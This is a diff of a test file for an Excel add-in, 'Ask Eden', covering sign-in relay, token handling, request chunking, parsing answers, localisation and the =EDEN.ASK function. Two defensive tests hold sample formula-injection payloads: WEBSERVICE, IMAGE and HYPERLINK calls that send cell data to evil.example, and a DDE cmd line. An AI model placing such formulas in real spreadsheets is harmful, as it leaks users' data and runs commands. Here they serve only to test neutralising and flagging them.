@@ -9,7 +9,7 @@ import { fileURLToPath } from 'node:url';
 import { test } from 'node:test';
 import vm from 'node:vm';
 import { challengeOf as serverChallenge } from '../src/accounts/scoped.js';
-import { parseSheet, SHEET } from '../src/eden/sheets.js';
+import { parseSheet, SHEET, cleanTokens as serverCleanTokens } from '../src/eden/sheets.js';
 
 const DIR = join(dirname(fileURLToPath(import.meta.url)), '..', 'public', 'addins', 'excel');
 const read = (name) => readFileSync(join(DIR, name), 'utf8');
@@ -64,6 +64,31 @@ test('connect: the consent address, the return check, the token body', () => {
   assert.deepEqual(X.readRedirect(`${back}?code=a.b&state=`, ''), { error: 'bad_state' });
 
   assert.deepEqual(X.tokenBody({ code: 'a.b', verifier: 'v', origin: 'https://askeden.com' }), { grant_type: 'authorization_code', code: 'a.b', code_verifier: 'v', client_id: 'excel', redirect_uri: back });
+
+  // The dialog opens on the add-in's own page (Office.js loads first), which goes on to the consent page.
+  const state = X.randomCode(18);
+  const challenge = 'c'.repeat(43);
+  const start = new URL(X.dialogUrl({ origin: 'https://askeden.com', state, challenge }));
+  assert.equal(start.origin + start.pathname, 'https://askeden.com/addins/excel/connect.html');
+  assert.ok(existsSync(join(DIR, 'connect.html')) && existsSync(join(DIR, 'connect.js')));
+  // Office adds its own _host_Info to the address; only state and the challenge are used.
+  const next = X.startTarget(`${start.search}&_host_Info=Excel$Win32$16.01$en-US`, 'https://askeden.com');
+  assert.equal(next, X.connectUrl({ origin: 'https://askeden.com', state, challenge }));
+  assert.equal(X.startTarget('?state=short&code_challenge=x', 'https://askeden.com'), null);
+  assert.equal(X.startTarget(`?state=${state}&code_challenge=${challenge}"><x`, 'https://askeden.com'), null);
+  // The relay's state rule on the server: 24 to 1,024 of these characters (ask.js RELAY_STATE).
+  assert.match(state, /^[A-Za-z0-9._~+/=-]{24,1024}$/);
+});
+
+test('connect on Excel on the web: the landing page relays the code, the pane polls for it (R1X1)', () => {
+  const landing = read('connected.js');
+  assert.match(landing, /fetch\('\/api\/eden\/relay', \{ method: 'POST', headers: \{ 'content-type': 'application\/json' \}, body: JSON\.stringify\(\{ state, code \}\) \}\)/);
+  assert.match(landing, /try \{\s*ui\.messageParent/, 'messageParent can throw: caught (R1X29)');
+  const pane = read('taskpane.js');
+  assert.match(pane, /fetch\('\/api\/eden\/relay\/take', \{ method: 'POST', headers: \{ 'content-type': 'application\/json' \}, body: JSON\.stringify\(\{ state: mine\.state \}\) \}\)/);
+  assert.match(pane, /setTimeout\(poll, 1500\)/, 'about every 1.5 s while the dialog is open');
+  assert.match(pane, /12007 \? t\('finishSignIn'\)/, 'a second Connect while one is open (R1X44)');
+  assert.match(pane, /12002 \|\| arg\.error === 12003 \? t\('cantLoadSignIn'\)/, 'a page that didn’t load isn’t "closed" (R1X29)');
 });
 
 test('the token: saved with its expiry, read back, forgotten', () => {
@@ -75,6 +100,12 @@ test('the token: saved with its expiry, read back, forgotten', () => {
   X.forgetToken(s);
   assert.equal(X.readToken(s), null);
   s.setItem(X.TOKEN_KEY, '{broken');
+  assert.equal(X.readToken(s), null);
+  // A late 401 for an old token forgets only that token (R1X31).
+  X.saveToken(s, { access_token: 'es1.new.b.c', expires_in: 60 });
+  X.forgetToken(s, 'es1.old.b.c');
+  assert.equal(X.readToken(s), 'es1.new.b.c');
+  X.forgetToken(s, 'es1.new.b.c');
   assert.equal(X.readToken(s), null);
 });
 
@@ -90,6 +121,11 @@ test('cells as sent: dates as shown, empties as null, long text capped', () => {
   assert.deepEqual(X.gridOf([[1, 'a'], ['', 45291]], [['1', 'a'], ['', '1/1/2024']]), [[1, 'a'], [null, '1/1/2024']]);
   assert.deepEqual(X.formulaGrid([['=A1+1', 3], ['x', '=SUM(A:A)']]), [['=A1+1', ''], ['', '=SUM(A:A)']]);
   assert.equal(X.formulaGrid([[1, 'x']]), null);
+  assert.deepEqual(X.kindsOf([[1, 'a', true, '', null]]), [['number', 'text', 'boolean', 'empty', 'empty']]);
+  // Fill and Clean never cut a cell: the first one too long is named instead (R1X3).
+  assert.deepEqual(X.longCell([['a', 'x'.repeat(2001)]]), [0, 1]);
+  assert.equal(X.longCell([['x'.repeat(2000)]]), null);
+  assert.deepEqual(X.longCell([['x'.repeat(1995) + '\n\n\n']], true), [0, 0], 'escaped line breaks count');
 });
 
 test('limits: too many cells or rows is refused before anything is read or sent', () => {
@@ -100,6 +136,38 @@ test('limits: too many cells or rows is refused before anything is read or sent'
   const fit = X.fitRows(Array.from({ length: 3000 }, () => ['a', 'b']));
   assert.equal(fit.rows, 2500);
   assert.equal(fit.trimmed, true);
+  assert.match(X.sizeProblem('fill', 1001, 1, X.wordsFor('fr')), /au plus 1\s000 lignes/);
+});
+
+test('Fill and Clean in parts, each one answer the server allows, at most 2 at a time (R1X35)', () => {
+  assert.equal(X.LIMITS.fillRows, SHEET.apps.excel.fillRows);
+  assert.equal(X.LIMITS.cleanTokens, SHEET.apps.excel.cleanTokens);
+  assert.equal(X.LIMITS.inFlight, 2);
+  const rows = Array.from({ length: 30 }, (_, i) => [`naïve café ${i} ✓`, i, null]);
+  assert.equal(X.cleanTokens(rows), serverCleanTokens(rows.map((r) => r.map((c) => (c === null ? '' : String(c))))));
+  // Fill: 1,000 rows → 5 parts of 200.
+  const fill = Array.from({ length: 1000 }, (_, i) => [`city ${i}`]);
+  const fp = X.chunksFor('fill', fill, null);
+  assert.deepEqual(fp.map((p) => p.end - p.start), [200, 200, 200, 200, 200]);
+  // Clean: a big selection splits so each part fits the server's clean budget, and the server takes each.
+  const big = Array.from({ length: 900 }, (_, i) => [`Name number ${i} with some text`, `Another column value ${i}`, i, 'paris ']);
+  const cp = X.chunksFor('clean', big, null);
+  assert.ok(cp.length > 1 && cp.length <= X.LIMITS.parts, `parts: ${cp.length}`);
+  assert.equal(cp[0].start, 0);
+  assert.equal(cp.at(-1).end, big.length);
+  for (const p of cp) {
+    const part = X.cleanSend(big.slice(p.start, p.end));
+    const { body, error } = X.sheetBody({ action: 'clean', sheet: { name: 'S', range: X.rangeName({ col: 0, row: 1 }, p.start, p.end - p.start, 4), values: part.values } });
+    assert.equal(error, undefined);
+    assert.doesNotThrow(() => parseSheet(body), `part ${p.start}-${p.end} is one answer the server allows`);
+  }
+  for (const p of fp) {
+    const { body } = X.sheetBody({ action: 'fill', instruction: 'country', sheet: { range: X.rangeName({ col: 0, row: 1 }, p.start, p.end - p.start, 1), values: fill.slice(p.start, p.end) } });
+    assert.doesNotThrow(() => parseSheet(body));
+  }
+  // Too much for 8 parts, or one row too big for an answer: refused in plain words.
+  assert.match(X.chunksFor('clean', Array.from({ length: 1000 }, () => ['x'.repeat(1900), 'y'.repeat(1900)]), null).error, /too much to clean at once/);
+  assert.match(X.chunksFor('clean', [Array.from({ length: 12 }, () => 'z'.repeat(1990))], null).error, /Row 1 of the selection is too long/);
 });
 
 test('request bodies: within the server’s limits, and the server takes them', () => {
@@ -133,6 +201,12 @@ test('request bodies: within the server’s limits, and the server takes them', 
   assert.ok(long.history.length <= SHEET.history);
   assert.equal(long.history[0].role, 'user');
   assert.equal(parseSheet(long).history.length, long.history.length);
+  // History never pushes a request over the server's characters: the oldest turns go first.
+  const values2 = Array.from({ length: 50 }, () => ['v'.repeat(1000)]);
+  const busy = X.sheetBody({ action: 'analyze', sheet: { values: values2 }, history: Array.from({ length: 6 }, (_, i) => ({ role: i % 2 ? 'eden' : 'user', text: 'h'.repeat(5000) })) }).body;
+  assert.ok(busy.history.length >= 1 && busy.history.length < 6);
+  assert.equal(busy.history[0].role, 'user');
+  assert.doesNotThrow(() => parseSheet(busy));
 });
 
 test('reading answers: one formula, one line per row, a same-shape clean, a table', () => {
@@ -140,10 +214,20 @@ test('reading answers: one formula, one line per row, a same-shape clean, a tabl
   assert.equal(X.formulaOf('```excel\n=XLOOKUP(A2,D:D,E:E)\n```'), '=XLOOKUP(A2,D:D,E:E)');
   assert.equal(X.formulaOf('Here you go:\n`=A1*2`'), '=A1*2');
   assert.equal(X.formulaOf('I can’t do that'), null);
+  // A closing quote that belongs to the formula stays (R1X7); quotes around the whole formula go.
+  assert.equal(X.formulaOf('=B2&" kg"'), '=B2&" kg"');
+  assert.equal(X.formulaOf('"=A1*2"'), '=A1*2');
+  assert.equal(X.formulaOf('“=IF(A1>0,"yes","no")”'), '=IF(A1>0,"yes","no")');
 
   assert.deepEqual(X.fillCheck('France\nFrance\nItaly\n', 3), { lines: ['France', 'France', 'Italy'] });
   assert.deepEqual(X.fillCheck('France\n\nItaly', 3), { lines: ['France', '', 'Italy'] });
   assert.deepEqual(X.fillCheck('a\nb\n\n\n', 2), { lines: ['a', 'b'] });
+  // Rows whose value really is blank at the end are kept (R1X34).
+  assert.deepEqual(X.fillCheck('France\nFrance\nItaly\n\n', 5), { lines: ['France', 'France', 'Italy', '', ''] });
+  assert.deepEqual(X.fillCheck('France\nItaly\n', 3), { lines: ['France', 'Italy', ''] });
+  // A preamble that pushes the answers down a row is refused (R1X39).
+  assert.match(X.fillCheck('Here are the countries:\nFrance\nFrance\nItaly', 4).error, /added a line before/);
+  assert.match(X.fillCheck('x', 2, X.wordsFor('fr')).error, /Eden a écrit 1 lignes pour 2/);
   assert.match(X.fillCheck('France\nItaly', 3).error, /2 lines for 3 rows, so nothing was written/);
   assert.match(X.fillCheck('a\nb\nc\nd', 3).error, /4 lines for 3 rows/);
 
@@ -160,24 +244,83 @@ test('reading answers: one formula, one line per row, a same-shape clean, a tabl
   const changes = X.cleanChanges(sent, ok.rows, [['', ''], ['', '=1+2'], ['', '']]);
   assert.deepEqual(changes, [{ r: 1, c: 0, from: 'paris ', to: 'Paris' }, { r: 2, c: 0, from: 'LYON', to: 'Lyon' }]);
   assert.deepEqual(X.cleanChanges([['Madrid ', 3]], [['Madrid', '3']]), [{ r: 0, c: 0, from: 'Madrid ', to: 'Madrid' }]);
+  // Booleans echoed as Excel shows them, and numbers re-spelled, aren't changes (R1X19).
+  assert.deepEqual(X.cleanChanges([[true, false, 3]], [['TRUE', 'faux', '3.0']], null, { kinds: [['boolean', 'boolean', 'number']] }), []);
+  assert.deepEqual(X.cleanChanges([[true]], [['no']], null, { kinds: [['boolean']] }), [{ r: 0, c: 0, from: 'true', to: 'no' }]);
+  // Blank first and last rows may be left out of the answer when they were blank (R1X33).
+  const edges = [[null, null], ['paris ', 1], ['LYON', 2], [null, '']];
+  assert.deepEqual(X.cleanCheck('Paris\t1\nLyon\t2', edges).rows, [['', ''], ['Paris', '1'], ['Lyon', '2'], ['', '']]);
+  assert.deepEqual(X.cleanCheck('\t\nParis\t1\nLyon\t2\n\t\n', edges).rows, [['', ''], ['Paris', '1'], ['Lyon', '2'], ['', '']]);
+  assert.match(X.cleanCheck('Paris\t1', edges).error, /3 rows for 4/);
+  // Line breaks and tabs inside a cell survive a clean: they go and come back escaped (R1X3).
+  const cells = [['Notes'], ['line one\nline two'], ['a\tb'], ['C:\\new'], ['x\u2028y']];
+  const out = X.cleanSend(cells);
+  assert.deepEqual(out.values, [['Notes'], ['line one\\nline two'], ['a\\tb'], ['C:\\new'], ['x\\u2028y']]);
+  assert.deepEqual(out.escaped.map((r) => r[0]), [false, true, true, false, true]);
+  assert.ok(out.values.every((r) => !/[\t\n\r\u0085\u2028\u2029]/.test(r[0])), 'nothing the server would flatten');
+  const echo = out.values.map((r) => r.join('\t')).join('\n');
+  const back = X.cleanReceive(X.cleanCheck(echo, out.values).rows, out.escaped);
+  assert.deepEqual(back, cells, 'a faithful echo changes nothing');
+  assert.deepEqual(X.cleanChanges(cells, back), []);
+  const fixed = X.cleanReceive(X.cleanCheck('Notes\nLine one\\nline two\na\\tb\nC:\\new\nx\\u2028y', out.values).rows, out.escaped);
+  assert.deepEqual(X.cleanChanges(cells, fixed), [{ r: 1, c: 0, from: 'line one\nline two', to: 'Line one\nline two' }]);
 
-  assert.deepEqual(X.tableCheck('Day\tPlan\nMon\tRun\tfast\n\n').rows, [['Day', 'Plan', ''], ['Mon', 'Run', 'fast']]);
+  // Short rows are padded to the header's width (a row wider than its header is refused: below).
+  assert.deepEqual(X.tableCheck('Day\tPlan\tNote\nMon\tRun\n\n').rows, [['Day', 'Plan', 'Note'], ['Mon', 'Run', '']]);
   assert.match(X.tableCheck('').error, /didn’t send back a table/);
   assert.match(X.tableCheck(Array.from({ length: 3000 }, () => 'a\tb').join('\n')).error, /too big/);
+  // Wrong shapes (R1X39): a preamble line, prose, rows wider than the header.
+  assert.match(X.tableCheck('Sure! Here is your table:\nDay\tTask\nMon\tRun').error, /line before the table/);
+  assert.match(X.tableCheck('I cannot make that table because the request is unclear and I need more detail.\nPlease say more.').error, /didn’t send back a table/);
+  assert.match(X.tableCheck('Day\tPlan\nMon\tRun\tfast\tnow').error, /don’t line up/);
+  assert.deepEqual(X.tableCheck('Item\nPen\nPaper').rows, [['Item'], ['Pen'], ['Paper']], 'a one-column table is fine');
 });
 
-test('writing back: model text never becomes a formula; plain numbers stay numbers', () => {
-  assert.equal(X.safeCell('=WEBSERVICE("https://evil.example/?"&A1)'), '\'=WEBSERVICE("https://evil.example/?"&A1)');
-  assert.equal(X.safeCell('+1 555 0100'), "'+1 555 0100");
-  assert.equal(X.safeCell('@SUM(A1)'), "'@SUM(A1)");
-  assert.equal(X.safeCell('-'), "'-");
-  assert.equal(X.safeCell('-12.5'), -12.5);
-  assert.equal(X.safeCell('42'), 42);
-  assert.equal(X.safeCell('007'), '007');
-  assert.equal(X.safeCell('France'), 'France');
+test('writing back: model text never becomes a formula, and text Excel would change goes in as text (R1X2)', () => {
+  const w = (s, kind) => X.cellWrite(s, kind);
+  // Formula-like text: an apostrophe and the Text format.
+  assert.deepEqual(w('=WEBSERVICE("https://evil.example/?"&A1)'), { v: '\'=WEBSERVICE("https://evil.example/?"&A1)', asText: true });
+  assert.deepEqual(w('+1 555 0100'), { v: "'+1 555 0100", asText: true });
+  assert.deepEqual(w('@SUM(A1)'), { v: "'@SUM(A1)", asText: true });
+  assert.deepEqual(w('-'), { v: "'-", asText: true });
+  // Plain numbers stay numbers.
+  assert.deepEqual(w('-12.5'), { v: -12.5, asText: false });
+  assert.deepEqual(w('42'), { v: 42, asText: false });
+  assert.deepEqual(w('0.5'), { v: 0.5, asText: false });
+  // What Excel would read as something else stays the text Eden wrote (the cell gets "@" first).
+  for (const s of ['007', '02134', '12345678901234567', '1-2', '3/4', '1/2', 'MARCH1', '5%', '1e400', '1E5', '12:30', '$1,200', '#N/A', 'TRUE', 'faux']) assert.deepEqual(w(s), { v: s, asText: true }, s);
+  assert.deepEqual(w('France'), { v: 'France', asText: false });
+  assert.deepEqual(w(''), { v: '', asText: false });
+  assert.deepEqual(w("'quoted'"), { v: "''quoted'", asText: false }, 'Excel takes one leading apostrophe away');
+  // Clean keeps each cell's kind: a text cell stays text, a number cell may be read, a boolean stays one.
+  assert.deepEqual(w('00123', 'text'), { v: '00123', asText: true });
+  assert.deepEqual(w('42', 'text'), { v: '42', asText: true });
+  assert.deepEqual(w('1200', 'number'), { v: 1200, asText: false });
+  assert.deepEqual(w('2024-01-05', 'number'), { v: '2024-01-05', asText: false }, 'a date cell stays a date');
+  assert.deepEqual(w('=1+1', 'number'), { v: "'=1+1", asText: false });
+  assert.deepEqual(w('TRUE', 'boolean'), { v: true, asText: false });
+  assert.deepEqual(w('Faux', 'boolean'), { v: false, asText: false });
+  assert.deepEqual(w('maybe', 'boolean'), { v: 'maybe', asText: false });
   assert.deepEqual(X.splitAddress("'Q1 ''24'!B2:D9"), { sheet: "Q1 '24", cells: 'B2:D9' });
   assert.deepEqual(X.splitAddress('Sheet1!A1'), { sheet: 'Sheet1', cells: 'A1' });
   assert.equal(X.cellsOf('B2'), 'B2');
+  assert.deepEqual(X.topLeftOf('Sheet1!$C$7:D9'), { col: 2, row: 7 });
+  assert.equal(X.cellName({ col: 25, row: 3 }, 2, 1), 'AA5');
+  assert.equal(X.rangeName({ col: 0, row: 1 }, 200, 100, 3), 'A201:C300');
+  assert.equal(X.rangeName({ col: 1, row: 4 }, 0, 1, 1), 'B4');
+});
+
+test('formulas that reach outside the workbook are flagged before Insert (R1X8)', () => {
+  assert.deepEqual(X.reachesOut('=SUM(B2:B9)'), []);
+  assert.deepEqual(X.reachesOut('=XLOOKUP(A2,Table1[Name],Table1[Price])'), [], 'structured references are fine');
+  assert.deepEqual(X.reachesOut('=A1&"WEBSERVICE( | [x.xlsx]"'), [], 'words inside text are fine');
+  assert.deepEqual(X.reachesOut('=WEBSERVICE("https://evil.example/?d="&ENCODEURL(TEXTJOIN(",",TRUE,A1:E7)))'), ['WEBSERVICE']);
+  assert.deepEqual(X.reachesOut('=_xlfn.IMAGE("https://x.example/a.png?"&A1)'), ['IMAGE']);
+  assert.deepEqual(X.reachesOut('=HYPERLINK("https://evil.example/"&A2,"Open")'), ['HYPERLINK']);
+  assert.deepEqual(X.reachesOut("=cmd|' /C calc'!A0"), ['DDE']);
+  assert.deepEqual(X.reachesOut("='https://evil.example/[x.xlsx]S'!A1"), ['external link']);
+  assert.deepEqual(X.reachesOut('=[Budget.xlsx]Sheet1!A1+[1]Sheet1!B2'), ['external link']);
+  assert.deepEqual(X.reachesOut('=RTD("x",,"y")+CALL("a","b","c")'), ['RTD', 'CALL']);
 });
 
 test('errors in plain words, with Connect or See your plan when they help', () => {
@@ -190,6 +333,14 @@ test('errors in plain words, with Connect or See your plan when they help', () =
   assert.match(X.errorWords(503, 'not_set_up').words, /isn’t ready/);
   assert.match(X.errorWords(0).words, /Can’t reach askeden\.com/);
   assert.match(X.errorWords(400, 'bad_request', 'Type what you want first.').words, /Type what you want/);
+  const fr = X.wordsFor('fr-FR');
+  assert.match(X.errorWords(402, 'no_allowance', 'No included AI is left this month.', fr).words, /Il ne reste plus d’IA incluse/);
+  assert.match(X.errorWords(0, '', '', fr).words, /Impossible de joindre askeden\.com/);
+  assert.match(X.errorWords(413, 'cut_off', 'cut').words, /cut off/);
+  // Busy: Retry-After (seconds) with a little jitter, else a growing wait, never more than 30 s.
+  assert.equal(X.retryWait('3', 0, () => 0), 3000);
+  assert.equal(X.retryWait(null, 2, () => 0), 6000);
+  assert.equal(X.retryWait('999', 0, () => 0), 30000);
 });
 
 test('the cell cache: keyed by prompt + values, kept, capped, cleared', () => {
@@ -207,6 +358,16 @@ test('the cell cache: keyed by prompt + values, kept, capped, cleared', () => {
   assert.equal(X.cacheClear(s), 500);
   assert.equal(X.cacheCount(s), 0);
   assert.equal(X.cellAnswer('Paris\nFrance'), 'Paris France');
+  // A blank answer is never kept; the index is written before old answers are dropped.
+  X.cachePut(s, 'eden-fx:blank', '  ');
+  assert.equal(s.getItem('eden-fx:blank'), null);
+  assert.equal(X.cacheCount(s), 0);
+  assert.deepEqual(X.trimGrid([[1, '', ''], ['', 2, ''], ['', '', ''], ['', '', '']]), [[1, ''], ['', 2]]);
+  assert.deepEqual(X.trimGrid([['', ''], ['', '']]), []);
+  assert.equal(X.cellResult('42'), 42);
+  assert.equal(X.cellResult('-3.5'), -3.5);
+  assert.equal(X.cellResult('007'), '007', 'leading zeros stay text');
+  assert.equal(X.cellResult('1,200'), '1,200');
 });
 
 test('light Markdown as blocks, never HTML', () => {
@@ -221,55 +382,220 @@ test('light Markdown as blocks, never HTML', () => {
   assert.equal(X.wordsFor('de-DE')('connect'), 'Connect');
   assert.equal(X.wordsFor('en')('cellsCount', { n: 3, cap: 100 }), 'Cell answers this session: 3 of 100.');
   for (const key of Object.keys(X.STRINGS.en)) assert.ok(X.STRINGS.fr[key], `French for ${key}`);
+  for (const key of Object.keys(X.STRINGS.fr)) assert.ok(X.STRINGS.en[key], `English for ${key}`);
+  // Italics without lookbehind (older Mac WebKit can't parse it, R1X17), same results as before.
+  assert.doesNotMatch(read('lib.js'), /\(\?<[!=]/);
+  assert.deepEqual(X.blocks('a *b* c_d_ _e_ 2*3*4')[0].runs, [{ t: 'a ' }, { t: 'b', i: true }, { t: ' c_d_ ' }, { t: 'e', i: true }, { t: ' 2*3*4' }]);
+  assert.deepEqual(X.blocks('*x* and *y*')[0].runs, [{ t: 'x', i: true }, { t: ' and ' }, { t: 'y', i: true }]);
+  assert.doesNotMatch(read('taskpane.js'), /requestSubmit/, 'Safari 15 has no requestSubmit (R1X17)');
+  // Every word the pane shows comes from STRINGS (French too, R1X13): t('key') keys all exist.
+  for (const file of ['taskpane.js', 'functions.js', 'connect.js', 'connected.js']) {
+    for (const [, key] of read(file).matchAll(/\bt\('([A-Za-z]+)'/g)) assert.ok(X.STRINGS.en[key] && X.STRINGS.fr[key], `${file}: ${key}`);
+    assert.doesNotMatch(read(file), /note\(`|note\('[A-Z]|warn\('[A-Z]|res\.(warn|done|confirm) = `[A-Z]|fail\('[A-Z]/, `${file}: no English sentence outside STRINGS`);
+  }
+  const html = read('taskpane.html');
+  for (const [, key] of html.matchAll(/data-i18n(?:-[a-z]+)?="([A-Za-z]+)"/g)) assert.ok(X.STRINGS.fr[key], `taskpane.html: ${key}`);
 });
 
-test('=EDEN.ASK: asks once per prompt + values, at most 4 at a time, stops at the session cap', async () => {
+test('accessibility: one live region, labelled icons, AA contrast, a footer that scrolls in a short pane', () => {
+  const html = read('taskpane.html');
+  assert.doesNotMatch(html, /<main id="log"[^>]*aria-live/, 'the log isn’t re-announced on every change (R1X14)');
+  assert.match(html, /id="status" role="status"/);
+  assert.match(html, /id="clear"[^>]*data-i18n-aria="clear"/, 'New chat has a label (R1X16)');
+  assert.match(html, /<summary[^>]*data-i18n-aria="more"/);
+  const pane = read('taskpane.js');
+  assert.match(pane, /setAttribute\('aria-busy'/);
+  assert.match(pane, /e\.key === 'Escape' && \$\('menu'\)\.open/, 'the ⋯ menu closes with Escape (R1X48)');
+  assert.match(pane, /render\(\{ focus: reply \}\)/, 'focus lands on the result after Insert, Fill, Replace (R1X38)');
+  // White text on the filled buttons and bubbles: at least 4.5:1, light and dark (R1X15).
+  const css = read('taskpane.css');
+  const lum = (hex) => {
+    const [r, g, b] = hex.match(/[0-9a-f]{2}/gi).map((h) => parseInt(h, 16) / 255).map((c) => (c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4));
+    return 0.2126 * r + 0.7152 * g + 0.0722 * b;
+  };
+  const ratio = (hex) => 1.05 / (lum(hex) + 0.05);
+  for (const [, hex] of css.matchAll(/--(?:accent-fill|stop): (#[0-9a-f]{6})/gi)) assert.ok(ratio(hex) >= 4.5, `${hex}: ${ratio(hex).toFixed(2)}`);
+  for (const rule of ['.turn.user', '.send', '.btn']) assert.match(css, new RegExp(`${rule.replace('.', '\\.')} \\{[^}]*background: var\\(--accent-fill\\)`), rule);
+  assert.match(css, /footer \{[^}]*max-height: 58vh; overflow-y: auto;/, 'the footer scrolls at 350 × 500 (R1X37)');
+});
+
+// A fresh copy of the cell function (its own counters), with fetch faked by `answer(body, call)`.
+function loadCells(answer) {
   const calls = [];
   let open = 0;
-  let most = 0;
-  const realFetch = globalThis.fetch;
+  const seen = { most: 0 };
   globalThis.fetch = async (url, init) => {
-    calls.push({ url, body: JSON.parse(init.body), auth: init.headers.authorization });
-    open += 1;
-    most = Math.max(most, open);
-    await new Promise((r) => setTimeout(r, 5));
-    open -= 1;
     const body = JSON.parse(init.body);
-    if (body.instruction === 'broke') return new Response(JSON.stringify({ error: 'No included AI is left on your Eden account.', code: 'no_allowance' }), { status: 402 });
-    return new Response(`answer to ${body.instruction}\n`, { status: 200 });
+    const call = { url, body, auth: init.headers.authorization, headers: init.headers, signal: init.signal };
+    calls.push(call);
+    open += 1;
+    seen.most = Math.max(seen.most, open);
+    try {
+      return await answer(body, call);
+    } finally {
+      open -= 1;
+    }
   };
+  delete globalThis.EdenPane;
+  vm.runInThisContext(read('functions.js'), { filename: 'functions.js' });
+  return { C: globalThis.EdenCells, calls, seen };
+}
+const one = (v) => [[v]]; // =EDEN.ASK's result: a 1 × 1 matrix
+const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+
+test('=EDEN.ASK: asks once per prompt + values, at most 2 at a time, stops at the session cap', async () => {
+  const realFetch = globalThis.fetch;
   try {
     storage.map.clear();
-    vm.runInThisContext(read('functions.js'), { filename: 'functions.js' });
-    const C = globalThis.EdenCells;
+    const { C, calls, seen } = loadCells(async (body) => {
+      await wait(5);
+      if (body.instruction === 'broke') return new Response(JSON.stringify({ error: 'No included AI is left on your Eden account.', code: 'no_allowance' }), { status: 402 });
+      if (body.instruction === 'how many') return new Response('42\n', { status: 200 });
+      return new Response(`answer to ${body.instruction}\n`, { status: 200 });
+    });
     await assert.rejects(C.ask('Sum it', [[1], [2]]), /Connect Ask Eden first/);
     assert.equal(calls.length, 0);
     assert.equal(C.takeNeedConnect(), 1);
 
     X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
-    assert.equal(await C.ask('Sum it', [[1], [2]]), 'answer to Sum it');
+    assert.deepEqual(await C.ask('Sum it', [[1], [2]]), one('answer to Sum it'));
     assert.equal(calls[0].url, '/api/eden/sheet');
     assert.equal(calls[0].auth, 'Bearer es1.acc.id.secret');
     assert.deepEqual(calls[0].body, { action: 'cell', app: 'excel', instruction: 'Sum it', sheet: { values: [[1], [2]] } });
     assert.equal(parseSheet(calls[0].body).action, 'cell');
-    assert.equal(await C.ask('Sum it', [[1], [2]]), 'answer to Sum it');
+    assert.deepEqual(await C.ask('Sum it', [[1], [2]]), one('answer to Sum it'));
     assert.equal(calls.length, 1, 'a recalculation doesn’t ask again');
-    assert.equal(await C.ask('Sum it', [['', '']]), 'answer to Sum it');
+    assert.deepEqual(await C.ask('Sum it', [['', '']]), one('answer to Sum it'));
     assert.equal(calls[1].body.sheet, undefined, 'an empty range sends no cells');
+    assert.deepEqual(await C.ask('how many'), one(42), 'a plain number goes in as a number (R1X18)');
 
     await Promise.all(Array.from({ length: 12 }, (_, i) => C.ask(`q${i}`)));
-    assert.ok(most <= 4, `at most 4 at once (saw ${most})`);
+    assert.ok(seen.most <= 2, `at most 2 at once, the server's limit per account (saw ${seen.most})`);
+    const before = C.state().used;
     await assert.rejects(C.ask('broke'), /See your plan/);
+    assert.equal(C.state().used, before, 'a failed ask doesn’t use up the cap (R1X22)');
     await assert.rejects(C.ask(''), /Type a question/);
 
     C.allowMore(0);
     await assert.rejects(C.ask('one more'), /paused after/);
-    assert.equal(await C.ask('q3'), 'answer to q3', 'saved answers still come back at the cap');
+    assert.equal(C.state().paused, 1);
+    assert.deepEqual(await C.ask('q3'), one('answer to q3'), 'saved answers still come back at the cap');
+    let recalcs = 0;
+    globalThis.EdenPane = { recalc: () => (recalcs += 1) };
     C.allowMore(5);
-    assert.equal(await C.ask('one more'), 'answer to one more');
+    assert.equal(recalcs, 1, 'Allow more works the paused cells out again (R1X22)');
+    assert.equal(C.state().paused, 0);
+    assert.deepEqual(await C.ask('one more'), one('answer to one more'));
     assert.ok(C.clearSaved() >= 13);
   } finally {
     globalThis.fetch = realFetch;
+    delete globalThis.EdenPane;
+    storage.map.clear();
+  }
+});
+
+test('=EDEN.ASK: whole columns trimmed, errors and dates as text, blank answers and broken streams never kept', async () => {
+  const realFetch = globalThis.fetch;
+  const realExcel = globalThis.Excel;
+  try {
+    storage.map.clear();
+    X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
+    let next = [];
+    const { C, calls } = loadCells(async () => {
+      const r = next.shift();
+      if (r === 'cutAnswer') return new Response('half (cut off)', { status: 200, headers: { 'x-eden-answer': 'cut' } });
+      if (r === 'timeout504') return new Response(JSON.stringify({ code: 'too_slow', error: 'Eden took too long.' }), { status: 504 });
+      if (r === 'break') return new Response(new ReadableStream({ start(c) { c.enqueue(new TextEncoder().encode('par')); c.error(new Error('cut_off')); } }), { status: 200 });
+      return new Response(r ?? 'ok', { status: 200 });
+    });
+    // A whole column (1,048,576 rows, 10 with data) is trimmed to its data (R1X12).
+    const column = Array.from({ length: 1048576 }, (_, i) => [i < 10 ? i + 1 : '']);
+    assert.deepEqual(await C.ask('Sum it', column), one('ok'));
+    assert.equal(calls.at(-1).body.sheet.values.length, 10);
+    await assert.rejects(C.ask('Too much', Array.from({ length: 6000 }, (_, i) => [i])), /smaller range/);
+    // An error in the range goes as its code (functions.json allowErrorForDataTypeAny, R1X21).
+    await C.ask('Errors?', [[1], [{ code: '#N/A' }]]);
+    assert.deepEqual(calls.at(-1).body.sheet.values, [[1], ['#N/A']]);
+    // Dates: the range's shown text, read through its address (R1X11).
+    globalThis.Excel = {
+      run: async (fn) => fn({
+        workbook: { worksheets: { getItem: (name) => ({ getRange: (cells) => ({ getCell: () => ({ getResizedRange: (r, c) => ({ load() {}, values: [[45291], [45292]], text: [['12/31/2023'], ['1/1/2024']], seen: { name, cells, r, c } }) }) }) }) } },
+        sync: async () => {},
+      }),
+    };
+    await C.ask('Which month?', [[45291], [45292]], { parameterAddresses: ['Sales!Z1', "'My sales'!C2:C3"] });
+    assert.deepEqual(calls.at(-1).body.sheet.values, [['12/31/2023'], ['1/1/2024']]);
+    // When Excel can't say (busy, or no address), the values go as they are.
+    globalThis.Excel = { run: () => new Promise(() => {}) };
+    C.timing.readMs = 20;
+    await C.ask('Which day?', [[45293]], { parameterAddresses: ['Z1', 'C2'] });
+    assert.deepEqual(calls.at(-1).body.sheet.values, [[45293]]);
+    // A blank answer isn't kept (R1X20); neither is a broken (cut off) one.
+    next = ['', 'fixed now'];
+    await assert.rejects(C.ask('Blank?'), /no answer/);
+    assert.deepEqual(await C.ask('Blank?'), one('fixed now'), 'asked again: the blank wasn’t kept');
+    next = ['break', 'whole'];
+    await assert.rejects(C.ask('Cut?'), /broke off/);
+    assert.deepEqual(await C.ask('Cut?'), one('whole'));
